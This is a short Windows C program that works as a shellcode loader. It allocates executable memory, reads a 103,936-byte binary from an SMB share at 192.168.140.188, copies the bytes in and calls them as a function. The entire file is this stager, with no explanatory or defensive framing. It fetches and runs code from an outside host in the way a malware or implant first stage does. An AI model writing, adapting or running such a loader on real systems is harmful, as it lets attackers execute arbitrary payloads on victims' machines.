#include <windows.h>
#include <stdio.h>

unsigned char buf[103936] = "";

void readBin(const char* fileName) {
    HANDLE hFile = CreateFileA(fileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return;
    }

    DWORD bytesRead;
    BOOL result = ReadFile(hFile, buf, sizeof(buf), &bytesRead, NULL);
    if (!result) {
        CloseHandle(hFile);
        return;
    }

    CloseHandle(hFile);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    LPVOID pAddr = VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    readBin("\\\\192.168.140.188\\share\\code.bin");
    memcpy(pAddr, buf, sizeof(buf));
    ((void(*)())pAddr)();

    return 0;
}
